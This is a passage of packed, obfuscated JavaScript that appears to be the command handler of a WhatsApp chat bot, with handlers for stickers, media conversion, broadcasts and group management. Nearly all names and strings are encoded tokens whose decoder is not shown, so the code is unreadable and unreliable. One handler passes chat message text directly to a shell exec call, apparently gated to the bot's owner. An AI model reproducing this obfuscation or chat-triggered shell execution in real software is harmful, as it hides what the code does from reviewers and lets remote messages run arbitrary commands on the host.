tt=A;K[\'1K\'](F,fs[tt(1C)](tt(26E)),2c,{\'1b\':L,\'1N\':tt(165)}),5a(1p,1w)})}T;H A(26F):{if(4Z(1p,2Y,1k,3B,1w))E 3o(A(7x)+R+A(7u));if(!N)E D(A(g4)+R+A(26G));D(1o[A(1Q)]);W 166=N[A(1B)](/(\\S+\\s*){1,13}/g,A(26H)),167=166[A(1y)](\'\\I\')[A(4U)](J,8E)[A(3n)](\'\\I\');iT(\'gt\',[A(26I),A(tj),A(tm),A(tn),\'LT\',\'-yC\',\'55\',A(Ft),\'2\',A(tp),\'+130+26J\',167,\'./5O/9L/5J/hq/xZ.3c\'])[\'on\'](A(9X),()=>D(A(Fu)))[\'on\'](A(tq),()=>{W tu=A;K[tu(1l)](F,fs[\'2B\'](tu(26K)),2c,{\'1b\':L,\'1N\':tu(165)}),5a(1p,1w)})}T;H\'26L\':H\'26M\':if(1A){if(N)E D(A(26N));if(L[A(1c)][\'2e\']===3T||L[A(1c)][A(1v)]===2O)E D(A(168));D(1o[A(1Q)]),169=L[\'1s\'][\'2e\'][A(1G)][\'2w\'];1Y{iv=M K[\'pY\'](169)}1P{iv=A(26O)}16a=M 3W(iv),K[A(1l)](F,16a,2c,{\'1b\':2d})}Y D(1o[A(1Q)]),16b=M K[\'pY\'](F)||A(26P),3q=M 3W(16b),K[A(1l)](F,3q,2c,{\'1N\':A(4X),\'1b\':L});T;H\'26Q\':if(1A){if(L[A(1c)][A(1v)]===3T||L[\'1s\'][A(1v)]===2O)E D(A(168));D(1o[A(1Q)]);1q 16c=L[A(1c)][A(1v)][A(1G)][A(5s)],16d=M K[\'wR\'](\'\'+16c,3K[A(4v)]);D(16d[A(aK)])}Y{D(1o[A(1Q)]);1q lS=M K[A(t7)](F,3K[A(4v)]);D(lS[A(aK)])}T;H A(26R):if(L[A(1c)][A(1v)]===2O||L[A(1c)][\'2e\']===3T)E D(A(26S));if(!3k&&!4o&&!2p&&2H[A(1m)]>8E){1a=5h[A(4U)](tV),tv=1a[A(1y)](\'|\')[J],eI=1a[A(1y)](\'|\')[U];if(5U(eI)>=dX)E D(A(mu));if(!5U(eI))E D(A(mA));1T(Z Fw=J;Fw<eI;Fw++){K[\'1K\'](F,\'\'+tv,3K[A(4v)])}}Y{if(!3k&&!4o&&!2p&&2H[A(1m)]<8E){1a=L[A(1c)][A(1v)][A(1G)][A(mv)][A(6A)];if(!5U(Q[J]))E D(A(mA));if(5U(Q[J])>=dX)E D(A(mu));1T(Z Fx=J;Fx<Q[J];Fx++){K[\'1K\'](F,1a,3K[\'2T\'])}}Y{if(3k){16e=1h[\'3l\'](1h[A(1V)](L)[A(1B)](A(2k),\'m\'))[A(1c)][A(1v)][A(1G)],16f=M K[\'6y\'](16e),tx=fs[\'2B\'](16f);if(!5U(Q[J]))E D(A(mA));if(5U(Q[J])>=dX)E D(\'PI!\');1T(Z Fy=J;Fy<Q[J];Fy++){2I(tx)}}Y{if(4o){16g=1h[\'3l\'](1h[A(1V)](L)[\'3h\'](A(2k),\'m\'))[\'1s\'][A(1v)][A(1G)],16h=M K[\'6y\'](16g),tx=fs[A(1C)](16h);if(!5U(Q[J]))E D(A(mA));if(5U(Q[J])>=dX)E D(A(mu));1T(Z Fz=J;Fz<Q[J];Fz++){K[A(1l)](F,tx,4J,{\'3j\':A(8w),\'Zz\':26T,\'6a\':!![]})}}Y{if(2p){5j=2p?1h[\'3l\'](1h[A(1V)](L)[A(1B)](\'6O\',\'m\'))[\'1s\'][A(1v)][\'1n\']:L,5k=M K[\'8r\'](5j),1a=5h[\'cL\'](mQ),tv=1a[A(1y)](\'|\')[J],eI=1a[A(1y)](\'|\')[U];if(5U(eI)>=dX)E D(A(mu));if(!5U(eI))E D(A(mA));1T(Z FA=J;FA<eI;FA++){K[A(1l)](F,5k,3K[\'8j\'],{\'1N\':tv})}}}}}}T;H A(26U):if(!L[\'2x\'][A(aF)])E;if(qg)E D(A(26V));H6(F),D(A(26W));T;H A(B2):if(!2W&&!L[A(1Z)][A(3i)])E;if(!1A)E D(1o[A(3u)][A(7c)]);if(!N)E D(A(26X)+R+\'eR\\B@b1\\o2\\B|\\26Y\\B\\B|\\6P\\B(1\\B=\\6P\\dv)\');if(qg)E D(A(26Z));if(L[\'1s\'][A(1v)][A(1G)][\'3a\'][A(1m)]>J||L[A(1c)][A(1v)][A(1G)]==3T){Z FB=L[A(1c)][A(1v)][A(1G)][A(5Y)][J];2K=Q[A(3n)](\'\\B\')[A(1B)](\'@\',\'\')[A(1y)](\'|\');if(!5U(2K[4D]))E D(A(270));M 5F(A(271)+\'@\'+FB[A(1y)](\'@\')[J]+A(272)+\'\\I\\I\'+(A(273)+2K[U]),[FB],!![]),H5(F,2K[U],2K[J],2K[4D],3o)}T;H\'274\':if(!N)E D(A(275));Z 16i=M K[A(276)](N,F,8E,U),16j=16i[\'yn\'],iE=16j[A(aM)](16k=>16k[A(1c)]);iE[A(kD)]();1Y{if(iE[J][A(1c)][A(6A)]==2O)E;D(A(277)+iE[A(1m)]+\'\\6l\'),M H3(AW);1T(Z ty=J;ty<iE[A(1m)];ty++){M K[A(1l)](F,A(278),1r,{\'1b\':iE[ty]})}}1P(279){D(A(27a))}T;H\'on\':if(!1k)E 1S();eU=![],D(A(27b));T;H A(27c):D(A(27d)+(eU?A(27e):A(27f))+\'\\I\'+(aV?A(27g):A(27h)));T;H\'pk\':if(!1k)E 1S();if(!N)E 3o(A(27i));if(!L[A(1Z)][\'2b\']&&!1k)E;eU=!![],gD=9m[\'pw\'](),16l=N?N:\'-\',ng=16l,D(A(27j)+N);T;H A(5i):if(!N)E D(A(27k));c9(\'\'+Q[J])[A(2h)](16m=>16m[A(4v)]())[A(2h)](16n=>{D(16n)});T;H A(14l):if(!N)E D(\'oF\\5C\');if(N==2O||N==\'\\B\')E D(A(27l)+N+\'*\\3Z\\L6\');16o=1L(A(27m)),16o({\'fu\':N})[\'5f\'](mB=>{W aQ=A;tA=\'\',tA+=aQ(27n)+N+aQ(16p);1T(Z iF=J;iF<mB[aQ(1m)];iF++){tA+=aQ(27o)+mB[iF][aQ(7S)]+aQ(27p)+mB[iF][aQ(27q)]+aQ(27r)+mB[iF][aQ(lC)]+\'\\I\\I\'}1q 16q=tA[aQ(8t)]();K[\'1K\'](F,16q,1r,{\'1b\':L})});T;H A(27s):H A(27t):if(!1k)E 1S();D(\'2G\\4k\\9d\\6k\\2z\\B\'+N),2q=\'\'+N;T;H\'27u\':H\'27v\':if(8L===![])E D(A(27w));if(!1k)E 1S();if(!N)E D(A(27x));D(A(27y)+N),iX=\'\'+N;T;H A(27z):if(!N)E D(A(16r)+R+\'vL\\8U|\\9d\');if(!L[A(1Z)][\'2b\']&&!1k&&!2W)E D(1o[\'9c\'][A(E2)]);eJ=Q[A(3n)](\'\'),c3=eJ[A(1y)](\'|\')[J],iG=eJ[A(1y)](\'|\')[U];if(mn(c3))E D(A(16s));FC=[];1T(Z 16t of 6Y){FC[A(4b)](16t[A(2D)])}dY=A(Ao)+\'Jp:3.0\\I\'+(A(Ap)+iG+\'\\I\')+(A(16u)+c3+\':\'+6K(\'+\'+c3)[\'k5\'](A(16v))+\'\\I\')+A(Aq)[A(8t)](),K[\'1K\'](F,{\'A0\':\'\'+iG,\'dY\':dY},zE,{\'1n\':{\'3a\':FC}});T;H\'v9\':1Y{if(!1A)E D(A(Ed));if(!N)E D(A(27A)+R+A(16w)+R+A(16x));1q tB=Q[\'9e\'](\'\\B\');2S=L[A(1c)][A(1v)][A(1G)][\'3a\'];1q 27B=tB[A(1y)](\'|\')[J],16y=tB[A(1y)](\'|\')[U],16z=tB[A(1y)](\'|\')[4D];K[\'1K\'](F,\'\'+16z,1r,{\'1b\':{\'2x\':{\'2b\':![],\'2w\':\'\'+2S,...F?{\'3f\':F}:{}},\'1s\':{\'b8\':\'\'+16y}}})}1P(27C){D(\'7p\\27D,\\27E\\B:\\I\'+R+A(16w)+R+A(16x))}T;H A(RL):3J?(D(1o[A(1Q)]),3A=1h[\'3l\'](1h[A(1V)](L)[A(1B)](A(2k),\'m\'))[A(1c)][\'2e\'][A(1G)],3G=M K[A(6p)](3A),2i=2E(A(7U)),3s(\'8F\\B-i\\B\'+3G+\'\\B-vn\\B\'+2i,FD=>{W mC=A;fs[\'5p\'](3G);if(FD)E D(mC(lL)+FD);6I=fs[mC(1C)](2i),K[\'1K\'](F,6I,4J,{\'3j\':mC(8w),\'1b\':L}),fs[mC(2g)](2i)})):D(A(27F));T;H A(RQ):3J?(D(1o[A(1Q)]),3A=1h[\'3l\'](1h[\'4S\'](L)[\'3h\'](A(2k),\'m\'))[A(1c)][\'2e\'][\'1n\'],3G=M K[\'6y\'](3A),2i=2E(A(9p)),3s(\'8F\\B-i\\B\'+3G+A(27G)+2i,FE=>{W gg=A;fs[gg(2g)](3G);if(FE)E D(gg(lL)+FE);6I=fs[gg(1C)](2i),K[gg(1l)](F,6I,4y,{\'3j\':gg(tC),\'1b\':L}),fs[gg(2g)](2i)})):D(A(FF));T;H A(RN):if(!3J)E D(A(FF));D(1o[A(1Q)]),3A=1h[A(1X)](1h[\'4S\'](L)[A(1B)](A(2k),\'m\'))[A(1c)][A(1v)][A(1G)],3G=M K[A(6p)](3A),2i=2E(A(9p)),3s(\'8F\\B-i\\B\'+3G+A(27H)+2i,FG=>{W gh=A;fs[gh(2g)](3G);if(FG)E D(gh(lL)+FG);6I=fs[gh(1C)](2i),K[gh(1l)](F,6I,4y,{\'3j\':gh(tC),\'1b\':L}),fs[gh(2g)](2i)});T;H\'LB\':if(!4o)E D(\'4q\\h8\');D(1o[A(1Q)]),16A=4o?1h[\'3l\'](1h[A(1V)](L)[A(1B)](A(2k),\'m\'))[\'1s\'][A(1v)][A(1G)]:L,FH=M K[\'6y\'](16A),2i=2E(A(7U)),3s(A(8x)+FH+\'\\B-af\\FI=4/3,jA=16B*3/4\\B\'+2i,(16C,27I,27J)=>{W tD=A;fs[tD(2g)](FH);if(16C)E D(tD(mD));6I=fs[tD(1C)](2i),K[\'1K\'](F,6I,4J,{\'3j\':\'8X/aA\',\'6a\':!![],\'1b\':L}),fs[\'5p\'](2i)});T;H\'hl\':if(!4o)E D(\'4q\\h8\');D(1o[A(1Q)]),16D=4o?1h[\'3l\'](1h[A(1V)](L)[\'3h\'](A(2k),\'m\'))[A(1c)][A(1v)][A(1G)]:L,FJ=M K[A(6p)](16D),2i=2E(A(7U)),3s(A(8x)+FJ+\'\\B-8S:a\\B\\Kh=1.6,jA=27K\\4t\\B\'+2i,(16E,27L,27M)=>{W mE=A;fs[mE(2g)](FJ);if(16E)E D(mE(mD));6I=fs[\'2B\'](2i),K[mE(1l)](F,6I,4J,{\'3j\':mE(8w),\'6a\':!![],\'1b\':L}),fs[\'5p\'](2i)});T;H A(RT):if(!4o)E D(A(27N));D(1o[A(1Q)]),16F=4o?1h[\'3l\'](1h[A(1V)](L)[A(1B)](A(2k),\'m\'))[A(1c)][A(1v)][A(1G)]:L,FK=M K[\'6y\'](16F),2i=2E(A(7U)),3s(A(8x)+FK+\'\\B-8S:a\\FI=1.dJ,jA=27O*1.25\\B\'+2i,(16G,27P,27Q)=>{W gj=A;fs[gj(2g)](FK);if(16G)E D(gj(mD));6I=fs[gj(1C)](2i),K[gj(1l)](F,6I,4J,{\'3j\':gj(8w),\'6a\':!![],\'1b\':L}),fs[gj(2g)](2i)});T;H A(27R):if(!4o)E D(\'4q\\h8\');D(1o[A(1Q)]),16H=4o?1h[A(1X)](1h[A(1V)](L)[A(1B)](A(2k),\'m\'))[A(1c)][A(1v)][A(1G)]:L,FL=M K[A(6p)](16H),2i=2E(A(7U)),3s(A(8x)+FL+A(27S)+2i,(16I,27T,27U)=>{W gk=A;fs[gk(2g)](FL);if(16I)E D(gk(mD));6I=fs[gk(1C)](2i),K[gk(1l)](F,6I,4J,{\'3j\':gk(8w),\'6a\':!![],\'1b\':L}),fs[gk(2g)](2i)});T;H A(RS):if(!4o)E D(\'4q\\h8\');D(1o[A(1Q)]),16J=4o?1h[A(1X)](1h[A(1V)](L)[\'3h\'](A(2k),\'m\'))[\'1s\'][A(1v)][\'1n\']:L,FM=M K[\'6y\'](16J),2i=2E(A(7U)),3s(A(8x)+FM+\'\\B-af\\FI=1/2,jA=16B*2/1\\B\'+2i,(16K,27V,27W)=>{W mF=A;fs[\'5p\'](FM);if(16K)E D(mF(mD));6I=fs[mF(1C)](2i),K[\'1K\'](F,6I,4J,{\'3j\':mF(8w),\'6a\':!![],\'1b\':L}),fs[mF(2g)](2i)});T;H A(27X):{Z FO=A(27Y)+ai[A(1m)]+\'\\I\\I\';1T(Z tE=J;tE<ai[A(1m)];tE++){FO+=A(27Z)+ai[tE][A(UJ)]+\'\\I\'}D(FO)}T;H A(RR):if(!3J)E D(A(FF));3A=1h[A(1X)](1h[A(1V)](L)[A(1B)](A(2k),\'m\'))[A(1c)][A(1v)][A(1G)],3G=M K[A(6p)](3A),2i=2E(A(9p)),3s(\'8F\\B-i\\B\'+3G+\'\\B-vf\\280\\B-af\\281\\B\'+2i,FP=>{W mG=A;fs[mG(2g)](3G);if(FP)E D(mG(lL)+FP);6I=fs[\'2B\'](2i),K[\'1K\'](F,6I,4y,{\'3j\':mG(tC),\'1b\':L}),fs[mG(2g)](2i)});T;H A(282):H\'sc\':H A(283):K[A(1l)](F,\'eY\\3N\\gU\\284\\b4\\yF\\b0://h2.be/285-286\',1r,{\'1b\':L,\'287\':!![]});T;H A(288):if(!N)E D(A(289));D(1o[A(1Q)]),eP[A(5i)](A(28a)+5h[\'cL\'](tU))[A(2h)](16L=>{W tF=A;Z 16M=\'*jt*\\B:\\I\'+16L[\'2J\'][tF(4C)];K[tF(1l)](F,16M,3K[tF(4v)],{\'1b\':L})});T;H\'oD\':if(!N)E D(\'28b\\B\'+R+A(28c));16N=M 7Z(A(28d)+N,{\'lG\':A(5i)}),K[A(1l)](F,\'\'+16N[A(4C)],1r,{\'1b\':2d});T;H A(28e):if(4Z(1p,2Y,1k,3B,1w))E 3o(\'dI\\2o\\3S\\bv\\bm\\7K\\B\'+R+A(7u));D(1o[A(1Q)]),c9(A(28f))[A(2h)](16O=>16O[A(4v)]())[A(2h)](16P=>{W iH=A;Z FQ=16P[\'2K\'](\'\\I\'),16Q=FQ[1u[\'4H\'](1u[iH(2s)]()*FQ[iH(1m)])];mS(16Q)[\'5f\'](16R=>{W FR=iH;3G=16S[FR(qW)](16R,FR(hv)),K[\'1K\'](F,3G,2c,{\'1b\':L,\'1N\':\'28g\'})})[iH(4m)](16T=>{W 16U=iH;1t[16U(1D)](16T)})});T;H A(28h):if(!N)E D(A(16r)+R+\'vL\\8U|\\9d\');eJ=Q[A(3n)](\'\\B\'),c3=eJ[A(1y)](\'|\')[J],iG=eJ[A(1y)](\'|\')[U];if(mn(c3))E D(A(16s));dY=A(Ao)+A(T2)+(A(Ap)+iG+\'\\I\')+(A(16u)+c3+\':\'+6K(\'+\'+c3)[A(a3)](A(16v))+\'\\I\')+A(Aq)[A(8t)](),K[A(1l)](F,{\'A0\':\'\'+iG,\'dY\':dY},zE);T;H A(28i):if(L[A(1c)][A(1v)]===2O||L[\'1s\'][A(1v)]===3T)E D(\'4q\\ju!\');if(1A){1q ex=L[A(1c)][\'2e\'][A(1G)][A(5s)];W 16V=K[\'by\'][ex]!=2O?K[\'by\'][ex][A(9g)]=2O?6K(\'+\'+ex[A(1B)](A(2t),\'\'))[A(a3)](\'k1\'):K[A(5X)][ex][A(9g)]||K[A(5X)][ex][\'yE\']:6K(\'+\'+ex[A(1B)](\'@s.2l.2v\',\'\'))[A(a3)](A(bS));D(16V)}Y{W 16W=K[A(5X)][F]!=2O?K[A(5X)][F][A(9g)]=2O?6K(\'+\'+F[\'3h\'](A(2t),\'\'))[A(a3)](A(bS)):K[A(5X)][F][A(9g)]||K[A(5X)][F][A(i6)]:6K(\'+\'+F[A(1B)](A(2t),\'\'))[A(a3)](A(bS));D(16W)}T;H A(28j):H A(28k):if(!3k)E D(A(28l)+R+\'QI\\28m|Qa\\28n\');3A=1h[A(1X)](1h[A(1V)](L)[A(1B)](A(2k),\'m\'))[A(1c)][A(1v)][A(1G)],3G=M K[A(6p)](3A),mH=Q[\'9e\'](\'\\B\')[A(1y)](\'|\'),16X=mH[J]!==\'\'?mH[J]:A(28o),16Y=28p mH[U]!==A(28q)?mH[U]:\'\',1L(A(16Z))[A(28r)](16X,16Y),1L(A(16Z))[A(28s)](3G,K,L,F);T;H A(28t):ge=Q[A(3n)](\'\');1q eJ=ge[A(1y)](\'|\')[J],170=ge[A(1y)](\'|\')[U],171=ge[A(1y)](\'|\')[4D],172=ge[A(1y)](\'|\')[eO];W 173=A(qp)+R+A(28u);if(Q[A(1m)]<U)E 3o(173);174=3k||2p?1h[\'3l\'](1h[A(1V)](L)[A(1B)](A(2k),\'m\'))[\'1s\'][A(1v)][A(1G)]:L,FS=M K[A(6p)](174),175=fs[\'2B\'](FS),176=\'\'+171,4l=\'\'+170,rr=\'\'+eJ,177=A(rl)+172;1q 4Y={\'28v\':![]},iI=M K[A(28w)](rr);iI[A(7S)]=4l,iI[A(rt)]=176,iI[A(28x)]=175,iI[A(28y)]=177,K[\'1K\'](F,iI,3K[A(28z)],4Y),fs[\'5p\'](FS);T;H\'28A\':H A(28B):if(!L[A(1Z)][\'2b\']&&!1k)E 3o(1o[\'9c\'][A(9k)]);1Y{aj[A(4A)](N,U),fs[A(5u)](A(DO),1h[A(1V)](aj)),M K[A(1l)](F,A(28C)+N+A(28D),1r)}1P(178){1t[\'3P\'](178),D(A(28E))}T;H\'28F\':if(!1k)E 1S();1Y{sl=cb[A(D5)](N),cb[A(4A)](sl,U),fs[A(5u)](A(11J),1h[A(1V)](cb)),fs[A(2g)](A(Bc)+N+A(7U)),K[A(1l)](F,A(DK),1r)}1P(179){1t[\'3P\'](179),D(\'zs\\1H\')}T;H A(28G):if(!1k&&!L[A(1Z)][A(3i)])E D(A(13Z));M D(A(28H)),3s(\'R5\\hp\');T;H\'11H\':1a=\'*28I\\jn\\B:*\\I\\I\';1T(Z 17a of ca){1a+=\'-\\B\'+17a+\'\\I\'}1a+=A(28J)+ca[\'2P\']+\'*\',K[A(1l)](F,1a[A(8t)](),kA,{\'1b\':L,\'1n\':{\'3a\':ca}});T;H A(11K):H A(28K):1a=A(28L);1T(Z 17b of cb){1a+=\'-\\B\'+17b+\'\\I\'}1a+=A(28M)+cb[A(1m)]+\'*\',1a+=\'\\I\\I*LG\\28N\\hn\\k8\\7H\\9d\\hn*\',K[A(1l)](F,1a[A(8t)](),kA,{\'1b\':{\'2x\':{\'2b\':![],\'2w\':A(2f),...F?{\'3f\':A(fN)}:{}},\'1s\':{\'2e\':{\'2T\':\'\'+2q,\'4l\':A(ql),\'5q\':3D}}},\'1n\':1F});T;H A(28O):H\'28P\':if(!1k&&!L[A(1Z)][A(3i)])E 1S();W FT=\'\'+Q[A(3n)](\'\\B\'),17c=FT[\'2K\'](\'|\')[J],17d=FT[A(1y)](\'|\')[U];do[A(lx)](17c,17d),M D(\'ps\\28Q\');T;H A(28R):H A(28S):H\'s\':if(2R&&!L[A(1c)][A(3Q)]||2p){W 17e=2p?1h[A(1X)](1h[A(1V)](L)[A(1B)](A(2k),\'m\'))[A(1c)][A(1v)][A(1G)]:L,mI=M K[\'6y\'](17e,A(iJ)+2a);M 8F(\'\'+mI)[A(28T)](mI)[\'on\'](A(i5),3V(a){W 17f=A;1t[\'3P\'](17f(17g)+a)})[\'on\'](\'dn\',3V(a){W tG=A;1t[tG(1D)](tG(17h)+a),fs[tG(2g)](mI),D(\'\'+a)})[\'on\'](\'JF\',3V(){W mJ=A;1t[mJ(1D)](\'17i\'),3s(mJ(28U)+2a+\'.6m\\B-o\\B./7o/\'+2a+mJ(9l),2A 17j=>{W c7=mJ;if(17j)E D(1o[\'dn\'][c7(mb)]);K[c7(1l)](F,fs[c7(1C)](c7(iJ)+2a+c7(9l)),7s,{\'1b\':L}),fs[c7(2g)](mI),fs[c7(2g)](c7(iJ)+2a+c7(9l))})})[\'Ls\']([\'-ft\',A(28V),A(17k),\'17l=\\17m(eK,iw)\\iK:17n\\iK(eK,ih)\\iK:17o=17p,kw=15,\\17q=eK:eK:-1:-1:1E=hg@0.0,\\17r\\B[a][b];\\B[a]\\17s=17t=on:17u=17v\\B[p];\\B[b][p]\\17w\'])[\'Mo\'](A(17x))[A(tf)](A(iJ)+2a+\'.6m\')}Y{if(2R&&L[A(1c)][A(3Q)][A(28W)]<El||3J&&L[\'1s\'][A(1v)][A(1G)][A(mv)][\'4u\'][\'dN\']<El){W 17y=3J?1h[A(1X)](1h[A(1V)](L)[A(1B)](A(2k),\'m\'))[\'1s\'][A(1v)][\'1n\']:L,iL=M K[A(6p)](17y,\'./7o/\'+2a);D(1o[A(1Q)]),M 8F(\'\'+iL)[A(28X)](iL[\'2K\'](\'.\')[c8])[\'on\'](A(i5),3V(a){W FU=A;1t[FU(1D)](FU(17g)+a)})[\'on\'](A(9X),3V(a){W eL=A;1t[eL(1D)](eL(17h)+a),fs[eL(2g)](iL),Ng=iL[\'bu\'](eL(9p))?eL(aH):\'cA\',D(1o[eL(9X)][eL(mb)])})[\'on\'](A(28Y),3V(){W mK=A;1t[mK(1D)](\'17i\'),3s(\'wg\\B-wh\\wi\\B./7o/2J.do\\B./7o/\'+2a+mK(28Z)+2a+mK(9l),2A FV=>{W iM=mK;if(FV)E D(FV);K[iM(1l)](F,fs[iM(1C)](iM(iJ)+2a+\'.6m\'),7s,{\'1b\':L}),fs[\'5p\'](iL),fs[iM(2g)](\'./7o/\'+2a+iM(9l))})})[A(290)]([A(291),\'Oa\',A(17k),\'17l=\\17m(eK,iw)\\iK:17n\\iK(eK,ih)\\iK:17o=17p,kw=15,\\17q=eK:eK:-1:-1:1E=hg@0.0,\\17r\\B[a][b];\\B[a]\\17s=17t=on:17u=17v\\B[p];\\B[b][p]\\17w\'])[A(292)](A(17x))[A(tf)](A(iJ)+2a+A(9l))}Y D(A(293)+R+\'7o\\3O\\ck\\8f/9K\\2F\\3S\\ko\\294\\B:\\h3\\nX\\295\\eX\\8o\')}T;H A(296):if(2R||2p){W 17z=2p?1h[A(1X)](1h[A(1V)](L)[A(1B)](A(2k),\'m\'))[A(1c)][A(1v)][A(1G)]:L,FW=M K[A(6p)](17z);tH=2E(A(9l)),5G=2E(A(AG)),D(1o[A(1Q)]),17A=A(297),M GK({\'Bm\':FW,\'298\':17A,\'jN\':A(17B),\'1e\':A(17B),\'5G\':5G})[A(2h)](17C=>{W eM=A;fs[eM(2g)](FW);Z 17D=16S[eM(qW)](17C[eM(299)],eM(hv));fs[eM(5u)](5G,17D,17E=>{W 17F=eM;if(17E)E D(17F(29a))}),3s(\'8F\\B-i\\B\'+5G+\'\\B-ft\\zb\\B-8S:v\\zc=kw=20\\B-zd\\6P\\B-ze\\cw\\B-zf\\zg\\B-an\\B-zh\\cw\\B-s\\zi:zj\\B\'+tH,FX=>{W tI=eM;fs[tI(2g)](5G);if(FX)E D(\'P8\\nu\\B\'+FX);K[\'1K\'](F,fs[tI(1C)](tH),7s,{\'1b\':L}),fs[tI(2g)](tH)})})}T;H A(29b):H A(29c):{if(!L[A(1Z)][\'2b\']&&!1k)E D(1o[\'9c\'][A(9k)]);if(3k){if(!N)E D(A(17G)+1z+A(29d));1q iN=L[A(1c)][A(1v)][A(1G)][A(mv)][A(bB)][A(kC)][A(cO)](\'fA\');if(zB(iN,7B)===!![])E D(A(11q));RZ(iN,N),D(A(md))}Y D(\'b1\\29e\')}T;H A(RM):4o&&(D(1o[\'5g\']),3A=1h[\'3l\'](1h[A(1V)](L)[A(1B)](A(2k),\'m\'))[\'1s\'][\'2e\'][A(1G)],3G=M K[A(6p)](3A),2i=2E(A(7U)),3s(A(8x)+3G+\'\\B\'+2i,17H=>{W iO=A;fs[iO(2g)](3G);if(17H)E D(iO(Ws));17I=fs[iO(1C)](2i),K[\'1K\'](F,17I,4J,{\'3j\':iO(8w),\'1b\':L,\'6a\':!![]}),fs[iO(2g)](2i)}));T;H A(29f):{if(!L[\'2x\'][A(3i)]&&!1k)E D(1o[A(3u)][\'9M\']);if(!3k)E D(A(17G)+1z+A(29g));1q iN=L[A(1c)][\'2e\'][A(1G)][A(mv)][A(bB)][\'cD\'][\'QA\'](\'fA\');if(zB(iN,7B)===![])E D(A(29h));7B[A(4A)](S4(iN),U),fs[A(5u)](A(S3),1h[A(1V)](7B)),D(A(md))}T;H A(29i):Z FY=A(29j),FZ=[];1T(Z tJ of 7B){FZ[\'7A\'](tJ[\'id\']),FY+=\'\\I\\I*•>\\pl\\B:*\\B\'+tJ[\'id\']+\'\\I*•>\\29k*\\B:\\B\'+tJ[A(bZ)]}5F(FY,FZ,!![]);T;H A(RK):if(!3k)E D(A(29l));D(1o[A(1Q)]),3A=1h[A(1X)](1h[\'4S\'](L)[A(1B)](\'6O\',\'m\'))[A(1c)][\'2e\'][A(1G)],3G=M K[\'6y\'](3A),2i=2E(\'.bh\'),3s(\'8F\\B-i\\B\'+3G+\'\\B\'+2i,17J=>{W mL=A;fs[mL(2g)](3G);if(17J)E D(mL(29m));3q=fs[\'2B\'](2i),K[mL(1l)](F,3q,2c),fs[mL(2g)](2i)});T;H A(29n):if(!N)E D(A(29o));17K=Q[A(3n)](\'\\B\'),5H[A(5i)](\'\'+17K)[A(2h)](17L=>{W G0=A;1a=\'\'+17L[G0(9u)][c8][\'4w\'],3p(F,\'\'+1a),1t[G0(1D)](1a)});T;H A(29p):if(!1A)E D(\'*IC\\4i*\');1Y{Z 17M=Q&&/\\d+\\-\\d+@g.us/[A(8u)](Q[J])?Q[J]:F,G1=[...5W[\'oi\'](K[\'dO\'][A(5i)](17M)[A(29q)]),K[A(dT)][A(2D)]];K[A(1l)](F,A(29r)+G1[A(5M)](17N=>A(29s)+17N[A(1B)](/@.+/,\'\'))[A(3n)]`\\n`,1r,{\'1b\':L,\'1n\':{\'3a\':G1}})}1P(17O){D(\'\'+17O)}T;H A(29t):W 17P=K[A(bZ)][A(4I)]()[A(aM)](17Q=>17Q[A(2D)][A(sg)](A(Dv)))[\'7O\'](tK=>\'-\\B\'+K[A(17R)](tK[A(2D)])+\'\\I\'+tK[A(2D)]+\'\\I[\'+(tK[\'29u\']?A(29v):A(29w))+\']\')[A(3n)]`\\n\\n`;D(17P);T;H\'29x\':{Z G2=M K[A(bZ)][A(4I)]()[A(aM)](17S=>17S[A(2D)][\'bu\'](A(29y)))[A(5M)](17T=>17T[A(2D)]),G3=\'⬣\\B*OD\\29z\\11O*\\I\\ci\\h9\\B:\\B\'+G2[A(1m)]+\'\\h9\\I\\I\';p9=[];1T(Z tL of G2){G3+=A(29A)+K[A(17R)](tL)+A(29B)+tL[A(1y)](\'@\')[J]+A(29C),p9[\'7A\'](tL)}D(G3)}T;H A(29D):3U=\'1I://ar.Ns.1W/wp-cJ/ke/Nt/pd/gu-fc-Nu.bh\',9q=M 3W(3U),fs[\'cI\'](A(29E),9q);T;H A(29F):{if(4Z(1p,2Y,1k,3B,1w))E 3o(A(7x)+R+A(7u));if(!N)D(A(29G));3U=A(29H),9q=M 3W(3U);Z 17U=M gu[A(29I)](\'id\',\'\'+N);1a=A(29J),17U[\'7O\'](3V(a,b){W mM=A;1a+=\'4Q*29K\\17V\\B\'+(b+U)+mM(16p)+a[mM(29L)][\'cJ\']+\'\\I\'+a[\'29M\'][mM(5M)]((17W,17X)=>\'*29N\\17V\\B\'+(17X+U)+\'*\\I\'+17W+\'\\I\')+mM(Cb)}),1a+=\'Ip\\f1\\v5\\29O\';Z 17Y=[{\'1i\':A(Ef),\'1j\':{\'1f\':A(my)},\'1e\':A(3I)},{\'1i\':R+A(G4),\'1j\':{\'1f\':A(29P)},\'1e\':\'9b\'}];4c(F,1a,\'©\\B\'+2C,9q,17Y,{\'1n\':1F}),5a(1p,1w)}T;H A(29Q):if(!L[A(1Z)][A(3i)]&&!1k)E D(1o[A(3u)][A(9k)]);if(!N)E D(1o[A(11I)]);3s(N,(G5,G6)=>{if(G5)E D(\'29R-xz:~\\B\'+G5);G6&&D(G6)});T;H A(3n):1Y{if(!1k)E D(A(29S));if(Q[\'2P\']<U)E D(A(g4)+R+\'9e*\\5c\\6Q\');if(!1A){if(!7g(Q[J])&&!Q[J][\'3y\'](\'b2.2l.1W\'))E D(1o[A(9X)][\'Iv\']);Z 17Z=Q[J][A(1B)](A(9t),\'\');K[\'PP\'](17Z),D(A(29T))}Y{if(!7g(Q[J])&&!Q[J][A(1M)](A(9t)))E D(A(Dk));9N=Q[J][\'3h\'](A(9t),\'\'),Dl=K[A(g7)]({\'3X\':[A(Dm),A(Dn),9N],\'ii\':!![]}),D(A(29U))}}1P(180){E 1t[A(1D)](180),D(A(Dp))}T;H A(181):K[A(1l)](F,fs[A(1C)](A(11B)),2c,{\'1b\':2d});T;H A(182):K[\'1K\'](F,fs[A(1C)](A(11D)),2c,{\'1b\':2d});T;H\'pN\':K[A(1l)](F,fs[\'2B\'](\'./pL\\fx/pN.3c\'),2c,{\'1b\':2d});T;H A(29V):H\'hu\':xJ=hP[A(Uy)](),1a=ub(xJ),pn=A(29W)+1a,D(pn);T;H A(Wg):H\'29X\':W 29Y=gq();3s(A(29Z),(2a0,183,2a1)=>{W eN=A,184=183[eN(cO)](eN(lU)),185=184[eN(1B)](/2a2:/,eN(2a3)),186=185+eN(2a4)+zL[eN(187)](c8)+\'\\2a5\';K[eN(1l)](F,186,1r,{\'1b\':2d})});T;H A(sE):if(!L[A(1Z)][\'2b\']&&!1k)E 